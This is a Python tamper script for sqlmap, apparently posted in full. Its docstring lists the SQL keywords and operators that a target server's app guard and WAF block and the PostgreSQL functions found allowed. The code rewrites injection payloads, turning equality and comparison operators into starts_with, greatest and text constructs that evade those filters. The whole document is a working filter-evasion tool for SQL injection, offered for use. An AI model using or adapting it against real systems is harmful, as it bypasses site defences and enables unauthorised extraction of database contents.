Full Tamper Script Below:
#!/usr/bin/env python
"""
The server has two blocklists that stop a stock sqlmap run:
  * app guard -> 400 error.msg.found.sql.injection
  * WAF -> 403 {"message":"Forbidden"}
They block: =  >  <  <>  !=  IN  SELECT  UNION  LIKE  IS  BETWEEN  --  /*  ::

Allowed (verified server-side): starts_with() text() greatest() substr()
  ascii() length() upper() coalesce() octet_length() md5() bool()
  CURRENT_USER CURRENT_SCHEMA() VERSION() current_setting()
  true/false not and or ( ) ' ,

This tamper rewrites sqlmap's payloads into those forms:

  Extraction:
    SUBSTRING(x FROM a FOR b) -> substr(x,a,b)
    CAST(x AS TEXT) -> text(x)
    x::text -> x
    CHR(32) -> ' '

  Operators:
    a = b -> (starts_with(text(a),text(b)) and starts_with(text(b),text(a)))
    a > b -> (greatest(a,b) "=" a) and not (a "=" b)   [balanced-operand aware]
    a < b -> b > a
    a<>b / a!=b -> not (a = b)
"""

import re

__priority__ = 100   # <= PRIORITY.HIGHEST, so sqlmap does not ask to "resolve tamper order"
__version__ = "2.1"


def _eq(a, b):
    a, b = a.strip(), b.strip()
    return "(starts_with(text(%s),text(%s)) and starts_with(text(%s),text(%s)))" % (a, b, b, a)


def _neq(a, b):
    return "not %s" % _eq(a, b)


def _gt(a, b):
    a, b = a.strip(), b.strip()
    return "(%s and %s)" % (_eq("greatest(%s,%s)" % (a, b), a), _neq(a, b))


def _gte(a, b):
    return "(%s or %s)" % (_gt(a, b), _eq(a, b))


def _norm(p):
    p = re.sub(r"\bCHR\s*\(\s*32\s*\)", "' '", p, flags=re.I)
    # CAST(x AS VARCHAR(10000)) / CAST(x AS TEXT) / CAST(x AS CHARACTER VARYING) -> text(x)
    p = re.sub(r"\bCAST\s*\((.*?)\s+AS\s+(?:TEXT|CHARACTER\s+VARYING|VARCHAR|CHAR)\s*(?:\(\s*\d+\s*\))?\s*\)",
               r"text(\1)", p, flags=re.I | re.S)
    p = re.sub(r"::\s*(?:text|varchar|character\s+varying)", "", p, flags=re.I)
    p = re.sub(r"\bSUBSTRING\s*\((.*?)\s+FROM\s+(\d+)\s+FOR\s+(\d+)\s*\)", r"substr(\1,\2,\3)", p, flags=re.I | re.S)
    return p


def _rewrite_gt(p):
    """Rewrite the trailing '<balanced-operand> > <number>' comparison."""
    i = p.rfind('>')
    if i == -1 or (i > 0 and p[i - 1] == '='):
        return p
    rhs = p[i + 1:].strip()
    if not re.fullmatch(r"\d+", rhs):
        return p
    lhs = p[:i].rstrip()
    j = len(lhs)
    if j == 0:
        return p
    if lhs[j - 1] == ')':
        depth, k = 0, j - 1
        while k >= 0:
            if lhs[k] == ')':
                depth += 1
            elif lhs[k] == '(':
                depth -= 1
                if depth == 0:
                    break
            k -= 1
        if k < 0:
            return p
        m = k
        while m > 0 and (lhs[m - 1].isalnum() or lhs[m - 1] in '_.'):
            m -= 1
        operand, start = lhs[m:j], m
    else:
        m = j
        while m > 0 and (lhs[m - 1].isalnum() or lhs[m - 1] in "_'"):
            m -= 1
        operand, start = lhs[m:j], m
    prefix = lhs[:start].rstrip()
    repl = _gt(operand, rhs)
    return (prefix + " " + repl) if prefix else repl


_ATOM = r"(?:'[^']*'|[A-Za-z_][A-Za-z0-9_\.]*(?:[()]*)?|\d+)"


def tamper(payload, **kwargs):
    if not payload:
        return payload
    p = _norm(payload)
    p = _rewrite_gt(p)
    p = re.sub(r"(%s)\s*(?:<>|!=)\s*(%s)" % (_ATOM, _ATOM), lambda m: _neq(m.group(1), m.group(2)), p)
    p = re.sub(r"(%s)\s*>=\s*(%s)" % (_ATOM, _ATOM), lambda m: _gte(m.group(1), m.group(2)), p)
    p = re.sub(r"(%s)\s*<=\s*(%s)" % (_ATOM, _ATOM), lambda m: _gte(m.group(2), m.group(1)), p)
    p = re.sub(r"(%s)\s*>\s*(%s)" % (_ATOM, _ATOM), lambda m: _gt(m.group(1), m.group(2)), p)
    p = re.sub(r"(%s)\s*<\s*(%s)" % (_ATOM, _ATOM), lambda m: _gt(m.group(2), m.group(1)), p)
    p = re.sub(r"(%s)\s*=\s*(%s)" % (_ATOM, _ATOM), lambda m: _eq(m.group(1), m.group(2)), p)
    return p
